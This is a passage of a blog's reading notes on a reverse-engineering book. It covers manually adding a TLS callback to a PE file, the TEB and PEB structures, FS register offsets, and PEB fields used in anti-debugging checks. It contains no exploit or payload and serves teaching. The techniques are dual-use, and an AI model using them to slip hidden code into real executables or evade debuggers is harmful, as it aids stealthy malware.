alt="image-20200711093140091"></p><blockquote><p>在Ollydbg调试器的默认设置下，调试器会在EP处暂停，而WinDbg调试器默认在系统启动断点暂停。</p></blockquote><p>使用CFF explorer查看tls回调表回调函数的地址。可以看到有2个回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103234916.png" alt="image-20200711103234916"></p><p>使用olldbg advanced插件，打开暂停在回调函数的选项。F9运行。可以看到，和上面查看的回调函数地址一样。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103428275.png" alt="image-20200711103428275"></p><h3 id="手工添加TLS回调函数"><a href="#手工添加TLS回调函数" class="headerlink" title="手工添加TLS回调函数"></a>手工添加TLS回调函数</h3><p>首先确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的那个位置。向PE文件添加代码或数据时，有三种方法：</p><blockquote><p>1.添加到节区的末尾的空白区域。2.增加最后一个节区的大小。3.在最后增加新节区。</p></blockquote><p>之前的内嵌打补丁使用的第1种方法，这里使用第二种。</p><p>查看最后一个节区的属性：<strong>注意section alignment:1000，file alignment:200</strong><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711105035280.png" alt="image-20200711105035280"></p><p>知道文件对齐单位是200，所以这里将最后一个节区大小增加200（即文件文件大小变为9200+200 = 9400），那需要修改最后一个节区的Raw Size从200增加到400。但是Virtual Size可以不修改，因为文件对齐单位是1000，加上200后也远小于1000的。</p><p>修改Raw Size：400。增加3个属性：1.节中包含代码；2.可执行；3.可写。</p><blockquote><p>20 IMAGE_SCN_CNT_CODE 节中包含代码</p><p>20000000 IMAGE_SCN_MEM_EXECUTE 可执行</p><p>80000000 IMAGE_SCN_MEM_WRITE 可写</p></blockquote><p>下面设置TLS表：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711110919960.png" alt="image-20200711110919960"></p><p>写入IMAGE_TLS_DIRECTORY结构体：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711115845463.png" alt="image-20200711115845463"></p><p>写入回调函数：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123118819.png" alt="image-20200711123118819"></p><p>成功：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123251886.png" alt="image-20200711123251886"></p><hr><h2 id="第四十六章-TEB"><a href="#第四十六章-TEB" class="headerlink" title="第四十六章 TEB"></a>第四十六章 TEB</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>TEB：线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。</p><p>TEB结构体中的重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x000</span> NtTib:_NT_TIB</span><br><span class="line">+<span class="number">0x030</span> ProcessEnvironmentBlock:Ptr32_PEB（指向PEB结构体的指针）</span><br></pre></td></tr></table></figure><p>NtTib成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISIRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>ExceptionList成员指向EXCEPTION_REGISIRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。</p><p>Self成员是_NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员是_NT_TIB结构体）</p><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>Ntdll.NtCurrentTeb（）API用来放回当前线程的TEB结构体的地址。</p><p>OD中载入一个程序，搜索该API并进入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717205028466.png" alt="image-20200717205028466"></p><blockquote><p>TEB结构体的地址与FS段寄存器所指的段内存的基址是一样的。</p></blockquote><h3 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h3><p>FS段寄存器用来指示当前线程的TEB结构体。实际上，FS寄存器并非直接指向TEB结构体的地址，它持有SDT的索引，而该索引持有实际的TEB地址。</p><blockquote><p>SDT位于内核内存区域，其地址存储在特殊的寄存器GDTR(全局描述符表寄存器)中。</p></blockquote><p>上述示意图：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717211000065.png" alt="image-20200717211000065"></p><p>由于段寄存实际存储的是SDT的索引，所以它也被称为“段选择符”，TEB结构体位于FS段选择符所指的段内存的起始地址处。</p><p>FS:[0x18] = TEB起始地址:</p><p><strong>FS:[0x18] = TEB.NtTib.Self = address of TIB = address of TEB = FS:0</strong></p><p>FS:[0x30] = PEB起始地址：</p><p><strong>FS:[0x30] = TEB.ProcessEnvironmentBlock = address of PEB</strong></p><p>FS:[0] = SEH起始地址：</p><p><strong>FS:[0] = TEB.NtTIb.ExceptionList = address of SEH</strong></p><hr><h2 id="第四十七章-PEB"><a href="#第四十七章-PEB" class="headerlink" title="第四十七章 PEB"></a>第四十七章 PEB</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>PEB：进程环境块，存放进程信息的结构体。</p><p>TEB结构体位于FS段选择符所指的段内存的起始地址处，而ProcessEnvironmentBlock成员位于距TEB结构体Offset 30位置，所以：FS:[30] = TEB.ProcessEnvironmentBlock = address of PEB</p><p>获取PEB的两种方法：</p><blockquote><p><strong>1.直接获取PEB地址：mov eax, dword ptr fs:[30];    fs:[30] = address of PEB</strong></p><p><strong>2。先获取TEB地址，再通过ProcessEnvironmentBlock成员+30偏移处获取：mov eax, dword pte fs:[18]; mov eax, dword ptr ds:[eax+30]</strong></p></blockquote><p>PEB中重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">002</span> BeingDebugged:UChar</span><br><span class="line">+<span class="number">008</span> ImageBaseAddress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c Ldr:Ptr32 _PEB_LDR_DATA</span><br><span class="line">+<span class="number">018</span> ProcessHeap:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">068</span> NtGlobalFlag:Uint4B</span><br></pre></td></tr></table></figure><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><h4 id="PEB-BeingDebugged"><a href="#PEB-BeingDebugged" class="headerlink" title="PEB.BeingDebugged"></a>PEB.BeingDebugged</h4><p>Kernel32.dll中的Kernel32!IsDebuggerPresent（）API:该API通过检查PEB.BeingDebugged成员确定是否正在调试进程（是返回1，否返回0）：<code>Bool WINAPI IsDebuggerPresent(void);</code><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718102652664.png" alt="image-20200718102652664"></p><blockquote><p>Windows 7中，IsDebuggerPresent()API是在Kernelbase.dll中实现。而在Windows XP及以前的版本的操作系统中，它在Kernel32.dll中实现。</p></blockquote><h4 id="PEB-ImageBaseAddress"><a href="#PEB-ImageBaseAddress" class="headerlink" title="PEB.ImageBaseAddress"></a>PEB.ImageBaseAddress</h4><p>PEB.ImageBaseAddress成员用来表示进程的Imagebase：GetModuleHandle()API用来获取ImageBase<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718103540596.png" alt="image-20200718103540596"></p><h4 id="PEB-Ldr"><a href="#PEB-Ldr" class="headerlink" title="PEB.Ldr"></a>PEB.Ldr</h4><p>PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">000</span> Length:Uint4B</span><br><span class="line">+<span class="number">004</span> Initialized:UChar</span><br><span class="line">+<span class="number">008</span> SsHandle:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c InLoadOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">014</span> InMemoryOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">01</span>c InInitializationOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">024</span> EntryInProgress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">028</span> ShutdownInProgress:UChar</span><br><span class="line">+<span class="number">02</span>c ShutdownThreadId:Ptr32 <span class="keyword">void</span></span><br></pre></td></tr></table></figure><blockquote><p>当模块（DLL）被加载到进程，通过PEB.Ldr成员可以直接获取该模块的加载基地址。</p></blockquote><p>_PEB_LDR_DATA结构体成员中有3个_LIST_ENTRY类型的成员（上面已标出）：<strong>_LIST_ENTRY结构体提供了双向链表的机制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125;LIST_ENTRY, *PLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>该链表中保存的信息：_LDR_DATA_TABLE_ENTRY结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PVOID Reserved[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserverd[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    Unicode_STRING FullDllName;</span><br><span class="line">    Byte Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><blockquote><p>每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形成_LIST_ENTRY双向链表。</p></blockquote><h4 id="PEB-ProcessHeap-amp-PEB-NtGlobalFlag"><a href="#PEB-ProcessHeap-amp-PEB-NtGlobalFlag" class="headerlink" title="PEB.ProcessHeap &amp; PEB.NtGlobalFlag"></a>PEB.ProcessHeap &amp; PEB.NtGlobalFlag</h4><p>PEB.ProcessHeap和PEB.NtGlobalFlag（像PEB.BeingDebugged一样）应用于反调试结束。若进程处于调试状态，则ProcessHeap于NtGlobalFlag成员就持有特定值。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;PS：本书将指引你进入美妙又刺激的代码逆向分析世界，开启一段神奇之旅！&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://www.Bxnop.cn/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
